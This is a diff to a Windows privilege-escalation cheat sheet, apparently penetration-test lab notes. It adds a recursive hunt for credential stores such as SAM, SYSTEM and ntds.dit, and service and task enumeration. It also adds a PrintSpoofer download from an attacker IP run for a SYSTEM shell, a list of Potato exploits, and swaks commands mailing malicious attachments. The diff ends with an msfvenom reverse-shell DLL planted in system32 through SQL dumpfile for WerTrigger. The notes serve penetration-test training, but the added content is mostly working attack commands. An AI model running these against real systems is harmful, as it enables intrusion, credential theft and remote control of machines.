@@ -1,4 +1,4 @@
-# Windows Enumeration
+# Windows Privilege Escalation
 
 ### Initial Access
 
@@ -70,7 +70,7 @@ There are several key pieces of information we should always obtain:
 > setspn -L iis_service # or any server,client you discover
 > net accounts # Obtain the account policy, lockout threshold
 > mountvol # to list all drives that are currently mounted) (no mount points might be interesting have a look at it
-Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.log,*.kdbx,*.git,*.rdp,*.config,*cups*,*print*,*secret*,*skylark*,*oscp*,*amsterdam*,*hint* -File -Recurse -ErrorAction SilentlyContinue | Where-Object { -not ($_.FullName -like "C:\Windows\servicing\LCU\*") -and -not ($_.FullName -like "C:\Windows\Microsoft.NET\Framework\*") -and -not ($_.FullName -like "C:\Windows\WinSxS\amd*") -and -not ($_.FullName -like "C:\Windows\WinSxS\x*")}
+Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.log,*.kdbx,*.git,*.rdp,*.config,*cups*,*print*,*secret*,*cred*,*.ini,SYSTEM,SAM,SECURITY,ntds.dit -File -Recurse -ErrorAction SilentlyContinue | Where-Object { -not ($_.FullName -like "C:\Windows\servicing\LCU\*") -and -not ($_.FullName -like "C:\Windows\Microsoft.NET\Framework\*") -and -not ($_.FullName -like "C:\Windows\WinSxS\amd*") -and -not ($_.FullName -like "C:\Windows\WinSxS\x*")}
 ```
 
 ### PowerView.ps1
@@ -1021,6 +1021,11 @@ net user
 net localgroup administrators # Verify new user is created
 ```
 
+```bash
+Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
+Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
+```
+
 #### Get-Service
 
 If a particular file has a vulnerability and you wanna see which process it is tied to (if any), run:
@@ -1041,6 +1046,7 @@ python3 -m http.server 80
 ```
 
 ```bash
+get-service # ensure that Spooler is running
 powershell -ep bypass
 iwr -uri http://192.168.119.2/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
 .\PrintSpoofer64.exe -i -c powershell.exe # -i to interact w the process &  -c to specify the command we want to execute
@@ -1048,6 +1054,23 @@ whoami # Verify that it worked, that you are not NT AUTHORITY\SYSTEM
 ```
 
 There are other similar tools such as RottenPotato, SweetPotato, or JuicyPotato.
+
+```bash
+# Juicy Potato - https://github.com/ohpe/juicy-potato
+Abuse SeImpersonate or SeAssignPrimaryToken Privileges for System Impersonation
+
+# Lovely Potato Automated Juicy Potato - https://github.com/TsukiCTF/Lovely-Potato
+Works only until Windows Server 2016 and Windows 10 until patch 1803
+
+# PrintSpoofer Exploit the PrinterBug for System Impersonation
+Works for Windows Server 2019 and Windows 10, Spooler Service needs to be on
+
+# RoguePotato Upgraded Juicy Potato
+Works for Windows Server 2019 and Windows 10
+
+# GodPotato - Best if Spooler Service isn't On
+Try both NET2 and NET4 unless you know which one to use
+```
 
 #### Decrypt GPP Password
 
@@ -1490,6 +1513,14 @@ dir /s /p local.txt
 #### Windows Services - insecure file persmissions
 
 ````bash
+get-service
+get-service ApacheHTTPServer | get-member
+get-service ApacheHTTPServer | Select-Object *
+Get-CIMInstance -Class Win32_Service -Filter "name ='ApacheHTTPServer' " | Select-Object *
+Get-CIMInstance -Class Win32_Service -filter "StartName != 'LocalSystem' AND NOT StartName LIKE 'NT Authority%' " | Select-Object * | Sort-Object StartName
+wmic service list brief
+sc query
+.\accesschk.exe -ucqv ApacheHTTPServer -accepteula
 accesschk.exe /accepteula -uwcqv "Authenticated Users" * #command refer to exploits below
 ````
 
@@ -1798,4 +1829,23 @@ python /opt/windows/targetedKerberoast/targetedKerberoast.py -d $dom -u 'hrapp-s
 python /opt/mmg-ods.py windows 192.168.45.178 80
 sudo swaks -t mailadmin@localhost --from jonas@localhost --attach @file.ods --server 192.168.218.140 --body body.txt --header "Subject: Staging Script"
 ```
-sudo swaks -t neil@bratarina --from _smtpd@COFFEECORP --attach @bad.odt --server $ip --body body.txt --header "Subject: Staging Script"https://github.com/gtworek/Priv2Admin
+```
+sudo swaks -t neil@bratarina --from _smtpd@COFFEECORP --attach @bad.odt --server $ip --body body.txt --header "Subject: Staging Script"
+```
+https://github.com/gtworek/Priv2Admin
+https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet?tab=readme-ov-file#kerberoast
+https://github.com/bitsadmin/wesng
+
+#### WerTrigger
+
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.231 LPORT=6969 -f dll > phoneinfo.dll
+
+# Place files into system32 as an administrator
+select load_file('C:\\xampp\\htdocs\\phoneinfo.dll') into dumpfile 'C:\\Windows\\system32\\phoneinfo.dll';
+select load_file('C:\\xampp\\htdocs\\Report.wer') into dumpfile 'C:\\Windows\\system32\\Report.wer';
+select load_file('C:\\xampp\\htdocs\\WerTrigger.exe') into dumpfile 'C:\\Windows\\system32\\WerTrigger.exe';
+
+cd C:\windows\system32
+.\WerTrigger.exe
+```
